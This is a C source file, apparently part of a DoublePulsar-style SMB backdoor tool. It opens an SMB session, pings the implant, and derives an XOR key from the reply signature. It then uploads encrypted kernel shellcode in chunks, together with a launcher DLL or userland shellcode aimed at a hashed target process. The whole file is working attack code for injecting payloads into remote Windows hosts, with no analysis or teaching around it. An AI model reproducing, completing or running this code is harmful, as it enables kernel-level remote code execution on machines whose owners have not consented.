#define _GNU_SOURCE
#include <errno.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

#include "config.h"

extern int smb_connect(const char *ip, int port);
extern void xor_buffer(uint8_t *data, size_t len, unsigned int key);

static uint32_t dp_process_hash(const char *name)
{
    uint32_t h = 0;
    size_t n = strlen(name);

    for (size_t i = 0; i <= n; ++i) {
        h = (h >> 13) | (h << 19);
        h += (unsigned char)name[i];
    }
    return h;
}

static uint32_t dp_inject_hash(const char *name)
{
    uint32_t h = 0;

    for (size_t i = 0; name[i] != '\0'; ++i) {
        h = h * 127u;
        h += (unsigned char)name[i];
    }
    return h;
}

static void put_le16(unsigned char *p, uint16_t v)
{
    p[0] = (unsigned char)(v & 0xff);
    p[1] = (unsigned char)((v >> 8) & 0xff);
}

static void put_be16(unsigned char *p, uint16_t v)
{
    p[0] = (unsigned char)((v >> 8) & 0xff);
    p[1] = (unsigned char)(v & 0xff);
}

static void put_le32(unsigned char *p, uint32_t v)
{
    p[0] = (unsigned char)(v & 0xff);
    p[1] = (unsigned char)((v >> 8) & 0xff);
    p[2] = (unsigned char)((v >> 16) & 0xff);
    p[3] = (unsigned char)((v >> 24) & 0xff);
}

static int send_all(int fd, const void *data, size_t length)
{
    const unsigned char *bytes = data;
    size_t sent = 0;

    while (sent < length) {
        ssize_t n = send(fd, bytes + sent, length - sent, MSG_NOSIGNAL);
        if (n < 0) {
            if (errno == EINTR)
                continue;
            return -1;
        }
        if (n == 0)
            return -1;
        sent += (size_t)n;
    }
    return 0;
}

static int recv_all(int fd, void *data, size_t length)
{
    unsigned char *bytes = data;
    size_t received = 0;

    while (received < length) {
        ssize_t n = recv(fd, bytes + received, length - received, 0);
        if (n < 0) {
            if (errno == EINTR)
                continue;
            return -1;
        }
        if (n == 0)
            return -1;
        received += (size_t)n;
    }
    return 0;
}

static int read_smb_frame(int fd, unsigned char **frame, size_t *frame_length)
{
    unsigned char header[4];
    uint32_t payload_length;
    unsigned char *buffer;

    if (recv_all(fd, header, sizeof(header)) < 0)
        return -1;

    payload_length = ((uint32_t)header[1] << 16) |
                     ((uint32_t)header[2] << 8) |
                     (uint32_t)header[3];

    buffer = malloc(sizeof(header) + (size_t)payload_length);
    if (buffer == NULL)
        return -1;

    for (size_t i = 0; i < sizeof(header); ++i)
        buffer[i] = header[i];

    if (payload_length != 0 &&
        recv_all(fd, buffer + sizeof(header), (size_t)payload_length) < 0) {
        free(buffer);
        return -1;
    }

    *frame = buffer;
    *frame_length = sizeof(header) + (size_t)payload_length;
    return 0;
}

static int open_session(const char *ip, int port, int *fd_out,
                        unsigned char uid[2], unsigned char tid[2], unsigned int *key_out)
{
    int fd;
    unsigned char tc[sizeof(SMB_TREE_CONNECT_PKT)];
    unsigned char dp[sizeof(DP_PING_PKT)];
    unsigned char *response = NULL;
    size_t response_len = 0;
    uint32_t sig;

    fd = smb_connect(ip, port);
    if (fd < 0)
        return -1;

    if (send_all(fd, SMB_NEGOTIATE_PKT, sizeof(SMB_NEGOTIATE_PKT) - 1) < 0)
        goto fail;
    if (read_smb_frame(fd, &response, &response_len) < 0)
        goto fail;
    free(response);
    response = NULL;

    if (send_all(fd, SMB_SESSION_SETUP_PKT, sizeof(SMB_SESSION_SETUP_PKT) - 1) < 0)
        goto fail;
    if (read_smb_frame(fd, &response, &response_len) < 0)
        goto fail;
    if (response_len >= 34) {
        uid[0] = response[32];
        uid[1] = response[33];
    }
    free(response);
    response = NULL;

    memcpy(tc, SMB_TREE_CONNECT_PKT, sizeof(tc));
    tc[32] = uid[0];
    tc[33] = uid[1];
    if (send_all(fd, tc, sizeof(tc) - 1) < 0)
        goto fail;
    if (read_smb_frame(fd, &response, &response_len) < 0)
        goto fail;
    if (response_len >= 30) {
        tid[0] = response[28];
        tid[1] = response[29];
    }
    free(response);
    response = NULL;

    memcpy(dp, DP_PING_PKT, sizeof(dp));
    dp[28] = tid[0];
    dp[29] = tid[1];
    dp[32] = uid[0];
    dp[33] = uid[1];
    if (send_all(fd, dp, sizeof(dp) - 1) < 0)
        goto fail;
    if (read_smb_frame(fd, &response, &response_len) < 0)
        goto fail;
    if (response_len < (size_t)SMB_RESP_SIGNATURE_END)
        goto fail;
    sig = (uint32_t)response[SMB_RESP_SIGNATURE_START] |
          ((uint32_t)response[SMB_RESP_SIGNATURE_START + 1] << 8) |
          ((uint32_t)response[SMB_RESP_SIGNATURE_START + 2] << 16) |
          ((uint32_t)response[SMB_RESP_SIGNATURE_START + 3] << 24);
    free(response);
    response = NULL;

    *key_out = 2u * sig ^ ((((sig >> 16) | (sig & 0x00FF0000u)) >> 8) |
                           (((sig << 16) | (sig & 0x0000FF00u)) << 8));
    *fd_out = fd;
    return 0;

fail:
    if (response != NULL)
        free(response);
    close(fd);
    return -1;
}

static int send_chunk(int fd, const unsigned char *payload, uint32_t total,
                      uint32_t offset, uint32_t chunk, unsigned int key,
                      const unsigned char uid[2], const unsigned char tid[2])
{
    unsigned char params[SMB_EXEC_PARAMS_LEN];
    unsigned char packet[SMB_TOTAL_PACKET_SIZE];
    unsigned char *response = NULL;
    size_t response_len = 0;
    size_t packet_len = (size_t)SMB_EXEC_TEMPLATE_LEN + SMB_EXEC_PARAMS_LEN + chunk;
    int result = -1;

    put_le32(params, total);
    put_le32(params + 4, chunk);
    put_le32(params + 8, offset);
    xor_buffer(params, sizeof params, key);

    memset(packet, 0, sizeof packet);
    memcpy(packet, DP_EXEC_PKT, SMB_EXEC_TEMPLATE_LEN);
    memcpy(packet + SMB_EXEC_TEMPLATE_LEN, params, SMB_EXEC_PARAMS_LEN);
    memcpy(packet + SMB_EXEC_TEMPLATE_LEN + SMB_EXEC_PARAMS_LEN, payload + offset, chunk);

    put_be16(packet + SMB_NETBIOS_LEN_OFFSET, (uint16_t)(chunk + SMB_EXEC_TEMPLATE_LEN +
              SMB_EXEC_PARAMS_LEN - 4));
    put_le16(packet + SMB_EXEC_TOTAL_DATA_OFFSET, (uint16_t)chunk);
    put_le16(packet + SMB_EXEC_DATA_COUNT_OFFSET, (uint16_t)chunk);
    put_le16(packet + SMB_EXEC_BYTE_COUNT_OFFSET, (uint16_t)(chunk + SMB_EXEC_PARAMS_LEN));
    packet[SMB_TID_OFFSET] = tid[0];
    packet[SMB_TID_OFFSET + 1] = tid[1];
    packet[SMB_UID_OFFSET] = uid[0];
    packet[SMB_UID_OFFSET + 1] = uid[1];

    if (send_all(fd, packet, packet_len) < 0)
        return -1;
    if (read_smb_frame(fd, &response, &response_len) < 0) {
        printf("upload_payload: sem resposta no chunk offset=%u\n", offset);
        return -1;
    }
    if (response_len > (size_t)DP_RESP_MUX_ID_OFFSET &&
        response[DP_RESP_MUX_ID_OFFSET] == DP_MULTIPLEX_ID_EXEC)
        result = 0;
    free(response);
    return result;
}

int upload_payload(const char *ip, int port, const char *payload_path, int payload_type)
{
    unsigned char *blob = NULL;
    unsigned char uid[2] = {0, 0};
    unsigned char tid[2] = {0, 0};
    unsigned int key = 0;
    size_t blob_len = 0;
    size_t payload_len;
    int fd = -1;
    int result = -1;

    const char *file_path = (payload_type == 1) ? TARGET_BINARY : payload_path;

    if (file_path == NULL)
        return -1;

    {
        FILE *file = fopen(file_path, "rb");
        long size;
        if (file == NULL)
            return -1;
        if (fseek(file, 0, SEEK_END) != 0) {
            fclose(file);
            return -1;
        }
        size = ftell(file);
        if (size <= 0 || fseek(file, 0, SEEK_SET) != 0) {
            fclose(file);
            return -1;
        }
        blob = malloc((size_t)size);
        if (blob == NULL) {
            fclose(file);
            return -1;
        }
        if (fread(blob, 1, (size_t)size, file) != (size_t)size) {
            fclose(file);
            free(blob);
            return -1;
        }
        fclose(file);
        blob_len = (size_t)size;
    }

    if (open_session(ip, port, &fd, uid, tid, &key) < 0) {
        free(blob);
        return -1;
    }
    printf("upload_payload: key=0x%08x type=%d blob=%zu\n", key, payload_type, blob_len);

    if (payload_type == 1) {
        size_t dll_total = (size_t)0x50D800;
        unsigned char *payload = malloc(KERNEL_RUNDLL_SIZE + dll_total);
        uint32_t total;
        uint32_t offset;

        if (payload == NULL)
            goto cleanup;
        memcpy(payload, KERNEL_RUNDLL_SHELLCODE, KERNEL_RUNDLL_SIZE);
        memset(payload + KERNEL_RUNDLL_SIZE, 0, dll_total);
        memcpy(payload + KERNEL_RUNDLL_SIZE, LAUNCHER_DLL, LAUNCHER_DLL_SIZE);
        put_le32(payload + KERNEL_RUNDLL_SIZE + LAUNCHER_DLL_SIZE, (uint32_t)blob_len);
        memcpy(payload + KERNEL_RUNDLL_SIZE + LAUNCHER_DLL_SIZE + 4, blob, blob_len);

        put_le32(payload + KERNEL_RUNDLL_TOTAL_OFFSET, (uint32_t)(dll_total + 3978));
        put_le32(payload + KERNEL_RUNDLL_DLLSIZE_OFFSET, (uint32_t)dll_total);
        put_le32(payload + KERNEL_RUNDLL_ORDINAL_OFFSET, 1);

        total = (uint32_t)(KERNEL_RUNDLL_SIZE + dll_total);
        xor_buffer(payload, total, key);

        for (offset = 0; offset < total; offset += (uint32_t)SMB_EXEC_SHELLCODE_LEN) {
            uint32_t chunk = total - offset;
            if (chunk > (uint32_t)SMB_EXEC_SHELLCODE_LEN)
                chunk = (uint32_t)SMB_EXEC_SHELLCODE_LEN;
            if (send_chunk(fd, payload, total, offset, chunk, key, uid, tid) < 0) {
                free(payload);
                goto cleanup;
            }
        }
        free(payload);
        result = 0;
    } else {
        unsigned char block[SMB_EXEC_SHELLCODE_LEN];
        size_t off = 0;
        size_t kernel_size;
        uint16_t userland_len;

        memset(block, 0x90, sizeof block);
        memcpy(block + off, KERNEL_SHELLCODE_X64_PART1,
               sizeof(KERNEL_SHELLCODE_X64_PART1) - 1);
        off += sizeof(KERNEL_SHELLCODE_X64_PART1) - 1;
        put_le32(block + off, dp_process_hash(TARGET_PROCESS));
        off += sizeof(uint32_t);
        memcpy(block + off, KERNEL_SHELLCODE_X64_PART2,
               sizeof(KERNEL_SHELLCODE_X64_PART2) - 1);
        off += sizeof(KERNEL_SHELLCODE_X64_PART2) - 1;
        kernel_size = off;
        userland_len = (uint16_t)(sizeof(USERLAND_SHELLCODE_X64) - 1);
        if (kernel_size + sizeof(uint16_t) + userland_len > sizeof block) {
            goto cleanup;
        }
        put_le16(block + kernel_size, userland_len);
        memcpy(block + kernel_size + sizeof(uint16_t),
               USERLAND_SHELLCODE_X64, userland_len);
        xor_buffer(block, sizeof block, key);
        if (send_chunk(fd, block, SMB_EXEC_SHELLCODE_LEN, 0,
                       SMB_EXEC_SHELLCODE_LEN, key, uid, tid) < 0)
            goto cleanup;
        result = 0;
    }

cleanup:
    if (fd >= 0)
        close(fd);
    free(blob);
    return result;
}